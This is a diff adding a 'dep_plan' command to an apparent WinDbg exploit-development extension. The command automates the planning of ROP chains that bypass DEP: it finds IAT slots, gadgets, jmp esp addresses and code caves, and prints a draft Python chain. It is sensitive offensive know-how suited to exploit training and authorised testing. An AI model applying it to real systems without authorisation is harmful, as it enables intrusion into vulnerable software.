+        sharedBad.length > 0 ? `Every address in ${moduleLabel2} (${hex325(first)} to ${hex325(last)}) holds the bad byte(s) ${sharedBad.map((byte) => byte.toString(16).toUpperCase().padStart(2, "0")).join(" ")}, so no gadget from it is usable.` : void 0
+      ].filter((warning) => warning !== void 0);
+      for (const warning of moduleWarnings)
+        warn(warning);
+      if (moduleWarnings.length === 0)
+        info(`${moduleLabel2} spans ${hex325(first)} to ${hex325(last)}: no ASLR, and its fixed high bytes are clean. The scan in [3/${n}] drops each address whose low bytes are bad.`);
+      summary.push({ Section: `[1/${n}] module`, Result: moduleWarnings.length === 0 ? "fixed, clean base" : `${moduleWarnings.length} warning(s)` });
+      section(`[2/${n}] IAT slot of ${depApi}`);
+      const iatRows = api.sc.iat_find(depApi).rows;
+      const slotRows = Array.from({ length: (_a2 = iatRows == null ? void 0 : iatRows.length) != null ? _a2 : 0 }, (_, i) => iatRows[i]).filter((row) => {
+        var _a3;
+        return new RegExp(`(^|!)${depApi}$`, "i").test(stripDml(String((_a3 = row.Symbol) != null ? _a3 : "")).trim());
+      });
+      const chosen = (_b = slotRows.find((row) => {
+        var _a3;
+        return stripDml(String((_a3 = row.Owner) != null ? _a3 : "")).toLowerCase().includes(moduleName.toLowerCase());
+      })) != null ? _b : slotRows[0];
+      const slotMatch = chosen ? /0x([0-9a-fA-F]+)/.exec(stripDml(String((_c = chosen.Slot) != null ? _c : ""))) : null;
+      const iatSlot = slotMatch ? parseInt(slotMatch[1], 16) >>> 0 : void 0;
+      const slotBad = iatSlot === void 0 ? [] : addressBadBytes(__bi(iatSlot), 4, badSet);
+      if (iatSlot === void 0) {
+        warn(`No module imports ${depApi}. Pick another API, or resolve it at run time (sc.iat_find("GetProcAddress")).`);
+      } else {
+        const owner = stripDml(String(chosen.Owner));
+        info(`Slot ${hex325(iatSlot)} in ${owner}. The chain reads the API address from it with mov eax, [eax].`);
+        if (!owner.toLowerCase().includes(moduleName.toLowerCase())) {
+          const ownerAslr = ((_d = moduleInfoByName(owner)) == null ? void 0 : _d.aslr) === "enabled";
+          warn(`${moduleLabel2} does not import ${depApi}; this slot belongs to ${owner}${ownerAslr ? ", which has ASLR, so the slot moves on every boot and needs a leak" : ""}. Check other modules with sc.iat_find, or resolve the API at run time.`);
+        }
+        if (slotBad.length > 0)
+          warn(`The slot address holds bad byte(s) ${slotBad.map((b) => hex325(b).slice(-2)).join(" ")}: build it with the recipe in [5/${n}].`);
+        else
+          info("The slot address has no bad byte, so it can be popped as it is.");
+      }
+      summary.push({ Section: `[2/${n}] IAT slot`, Result: iatSlot === void 0 ? "not found" : `${hex325(iatSlot)}${slotBad.length > 0 ? " (bad bytes)" : ""}` });
+      section(`[3/${n}] Gadget corpus from ${moduleName}`);
+      executeRopScanLive(moduleName, badText);
+      const corpus = currentRopCorpus;
+      const gadgetCount = (_e = corpus == null ? void 0 : corpus.gadgets.length) != null ? _e : 0;
+      info(`${gadgetCount} gadgets and ${corpus ? summarizeCapabilities(corpus).length : 0} capabilities, every address free of the bad bytes.`);
+      summary.push({ Section: `[3/${n}] corpus`, Result: `${gadgetCount} gadgets` });
+      section(`[4/${n}] Best 3 candidates per job (${style} style)`);
+      info("Ranked by fewest side effects, then the smallest stack move. Side effects are listed after each gadget.");
+      const best = {};
+      for (const job of jobsFor(style)) {
+        const found = corpus ? candidates2(corpus, job) : [];
+        best[job.key] = found[0];
+        for (const line of candidateLines(found, job))
+          print(line);
+      }
+      let jmpEsp;
+      if (style === "pushad") {
+        for (const [label, bytes] of [["jmp esp", "FF E4"], ["call esp", "FF D4"]]) {
+          invoke("find_bytes", [moduleName, bytes, 20]);
+          const hits = ((_f = lastResult == null ? void 0 : lastResult.findings) != null ? _f : []).map((hit) => Number(hit)).filter((hit) => Number.isFinite(hit) && addressBadBytes(__bi(hit), 4, badSet).length === 0).slice(0, 3);
+          print(`  ${label}: ${hits.length > 0 ? hits.map(hex325).join("  ") : "none without bad bytes"}`);
+          jmpEsp = jmpEsp != null ? jmpEsp : hits[0];
+        }
+      }
+      const missing = jobsFor(style).filter((job) => !best[job.key]).map((job) => job.title);
+      if (missing.length > 0)
+        warn(`No candidate for: ${missing.join(", ")}. Scan more modules with rop.scan_live(..., true) or use another method.`);
+      summary.push({ Section: `[4/${n}] candidates`, Result: missing.length === 0 ? "every job has one" : `missing ${missing.length}` });
+      section(`[5/${n}] Clean recipes for the constants`);
+      for (const constant of CONSTANTS[depApi]) {
+        info(`${constant.field} = ${hex325(constant.value)}`);
+        executeRopConstruct("eax", constant.value, badText);
+      }
+      if (iatSlot !== void 0 && slotBad.length > 0) {
+        info(`IAT slot = ${hex325(iatSlot)}`);
+        executeRopConstruct("eax", iatSlot, badText);
+      }
+      const pickCave = (minSize, capability2) => {
+        const { caves } = findCodeCaves(moduleName, minSize, 25, badText, capability2);
+        const cave2 = caves.find((candidate) => candidate.addrSafe !== false || candidate.safeVa !== null);
+        if (!cave2)
+          return void 0;
+        return Number(cave2.addrSafe === false && cave2.safeVa !== null ? cave2.safeVa : cave2.address);
+      };
+      const writable = depApi === "VirtualAlloc" ? void 0 : pickCave(4, "STAGING");
+      const cave = depApi === "WriteProcessMemory" ? pickCave(528, "EXEC") : void 0;
+      if (depApi !== "VirtualAlloc") {
+        const field = depApi === "VirtualProtect" ? "lpflOldProtect" : "lpNumberOfBytesWritten";
+        if (writable === void 0)
+          warn(`${field}: no clean writable cave in ${moduleName}. Try dx @$osed().code_caves("", 4, 25, "${badText}", "STAGING").`);
+        else
+          info(`${field} = ${hex325(writable)}, a writable cave with no bad byte (code_caves STAGING).`);
+      }
+      if (depApi === "WriteProcessMemory") {
+        if (cave === void 0)
+          warn(`Code cave: none of 0x210 bytes with a clean address in ${moduleName}. Try dx @$osed().code_caves("", 0x210, 25, "${badText}", "EXEC").`);
+        else
+          info(`Code cave (return address and lpBaseAddress) = ${hex325(cave)}, executable (code_caves EXEC).`);
+      }
+      summary.push({ Section: `[5/${n}] constants`, Result: `${CONSTANTS[depApi].length} recipes` });
+      section(`[6/${n}] ${style === "pushad" ? "PUSHAD register map" : "Call frame"} for ${depApi}`);
+      if (style === "pushad")
+        printPushadMap(depApi);
+      else
+        invoke("dep_function", [depApi]);
+      summary.push({ Section: `[6/${n}] frame`, Result: style === "pushad" ? "register map" : "dep_function frame" });
+      section(`[7/${n}] Python draft: verify it field by field, it is not a finished chain`);
+      for (const line of draftLines({ api: depApi, style, module: moduleName, iatSlot, writable, cave, best, jmpEsp }))
+        print(line);
+      summary.push({ Section: `[7/${n}] draft`, Result: "TODO lines mark what only a debugger run can give" });
+      setResult({
+        command: "dep_plan",
+        args: { api: depApi, module: moduleName, badchars: badText, style },
+        success: true,
+        findings: [{ api: depApi, module: moduleName, style, iatSlot, writable, cave, gadgets: gadgetCount, missing }],
+        warnings: [...moduleWarnings, ...missing.length > 0 ? [`No candidate for: ${missing.join(", ")}`] : []],
+        errors: []
+      });
+      return toDxResult("DEP Plan", summary);
+    };
     for (const command2 of registry.getAll()) {
       api[command2.name] = (...args) => {
         return invoke(command2.name, args);
@@ -24928,6 +25360,7 @@ ${INDENT}`)]);
       }
     };
     api.rop_find = (...args) => invoke("rop", args);
+    api.dep_plan = executeDepPlan;
     api.exploit = {
       workflow: (...args) => {
         if (args.length === 1 && args[0] === "help")
